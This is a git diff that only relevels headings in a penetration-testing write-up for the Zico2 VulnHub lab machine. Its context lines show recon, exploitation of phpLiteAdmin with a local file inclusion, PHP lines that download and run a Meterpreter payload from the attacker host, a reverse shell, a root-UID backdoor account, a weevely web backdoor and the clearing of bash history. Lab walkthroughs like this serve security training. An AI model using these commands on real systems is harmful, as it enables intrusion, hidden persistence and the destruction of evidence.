@@ -13,9 +13,9 @@ Zico2 is an example of learning about penetration testing, a method of learning 
 ## Templates
 https://www.vulnhub.com/entry/zico2-1,210/
 
-### Methodology & Technique
+## Methodology & Technique
 ## Reconnaissance
-# Network Mapping
+### Network Mapping
 ```
 nmap -A -v -T5 -sS 192.168.1.1
 ```
@@ -25,7 +25,7 @@ nmap -A -v -T5 -sS 192.168.1.1
 -T5 = Set timing template (higher is faster)
 -sS = TCP SYN/Connect()/ACK/Window/Maimon scans
 
-# Information Gathering/Footprinting
+### Information Gathering/Footprinting
 ```
 ping 192.168.1.1
 telnet 192.168.1.1 80
@@ -38,7 +38,7 @@ curl -I 192.168.1.1
 -I = Fetch the headers only!
 
 ## Reporting
-# Creating Reconnaissance Report
+### Creating Reconnaissance Report
 ```
 nmap -A -v -T5 -sS 192.168.1.1 -oN 192.168.1.1-top10TCP.nmap
 ```
@@ -50,7 +50,7 @@ nmap -A -v -T5 -sS 192.168.1.1 -oN 192.168.1.1-top10TCP.nmap
 -oN = Output scan in normal
 
 ## Scanning
-# Web Object Scanning
+### Web Object Scanning
 ```
 dirsearch -u http://192.168.1.1 -w /usr/share/dirb/wordlists/common.txt -e php
 ```
@@ -60,7 +60,7 @@ dirsearch -u http://192.168.1.1 -w /usr/share/dirb/wordlists/common.txt -e php
 -e = Extensions
 
 
-# Web Vulnerabilities Scanning
+### Web Vulnerabilities Scanning
 ```
 uniscan -u 192.168.1.1 -qweds
 ```
@@ -73,18 +73,18 @@ uniscan -u 192.168.1.1 -qweds
 -s = Enable Static checks
 
 ## Exploitation
-# Searching Exploit
+### Searching Exploit
 ```
 searchsploit phpliteadmin
 cat /opt/searchsploit/exploits/php/webapps/24044.txt
 ```
 
-# Google Dorking
+### Google Dorking
 ```
 inurl: phpliteadmin default password
 ```
 
-# Creating Meterpreter Shell
+### Creating Meterpreter Shell
 ```
 msfvenom -a x64 --platform linux -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.2 LPORT=443 -f elf -o shell
 mv shell /usr/share/nginx/html/
@@ -95,7 +95,7 @@ vim /usr/databases/meterpreter_reverse_tcp_shell.php
 <?php system("cd /tmp; wget http://192.168.1.2/shell; chmod 777 shell; ./shell"); ?>
 ```
 
-# Creating Meterpreter Exploit
+### Creating Meterpreter Exploit
 ```
 service postgresql start
 msfconsole
@@ -108,12 +108,12 @@ set LPORT 443
 exploit
 ```
 
-# Accessing Meterpreter Shell
+### Accessing Meterpreter Shell
 ```
 http://192.168.1.1/view.php?page=../../usr/databases/meterpreter_reverse_tcp_shell.php
 ```
 
-# Accessing Pseudo-Terminal
+### Accessing Pseudo-Terminal
 ```
 shell
 ```
@@ -125,7 +125,7 @@ python -c 'import pty; pty.spawn("/bin/bash")'
 pty = Pseudo-terminal utilities
 pty.spawn = Module for controling pseudo-terminal
 
-# Creating Reverse Shell
+### Creating Reverse Shell
 ```
 cd /usr/share/nginx/html
 vim shell.txt
@@ -141,7 +141,7 @@ vim /usr/databases/php_system_reverse_shell.php
 <?php system("wget http://192.168.1.2/shell.txt -O /tmp/shell.php; php /tmp/shell.php"); ?>
 ```
 
-# Accessing Reverse Shell
+### Accessing Reverse Shell
 ```
 nc -lvp 1234 / netcat -lvp 1234
 ```
@@ -206,7 +206,7 @@ id root
 ```
 
 ## Backdooring
-# Creating Backdoored User Login
+### Creating Backdoored User Login
 ```
 useradd -ou 0 -g 0 zombie
 passwd zombie
@@ -217,7 +217,7 @@ id zombie
 -u = --uid (User ID) -> 0 (Root User) / 1000 (Sudo User)
 -g = --gid (Group ID)
 
-# Creating PHP Backdoored
+### Creating PHP Backdoored
 ```
 weevely generate b@cKd00r3d /usr/share/nginx/html/backdoored
 chmod 777 /usr/share/nginx/html/backdoored
@@ -227,7 +227,7 @@ vim /usr/databases/post_exploitation_backdoored.php
 <?php system("cd /tmp; wget http://192.168.1.2/backdoored; chmod 777 backdoored; mv backdoored backdoored.php"); ?>
 ```
 
-# Accessing PHP Backdoored
+### Accessing PHP Backdoored
 ```
 http://192.168.1.1/view.php?page=../../usr/databases/post_exploitation_backdoored.php
 ```
@@ -244,9 +244,9 @@ cat /dev/null > ~/.bash_history && history -c
 ```
 -c = Clear the history list
 
-### Vulnerability Patching
-## Local File Inclusion
-# Vulnerable Code
+## Vulnerability Patching
+### Local File Inclusion
+### Vulnerable Code
 ```
 cat view.php
 ```
@@ -257,7 +257,7 @@ cat view.php
 ?>
 ```
 
-# Patch Code
+### Patch Code
 ```
 cat view.php-patch
 ```
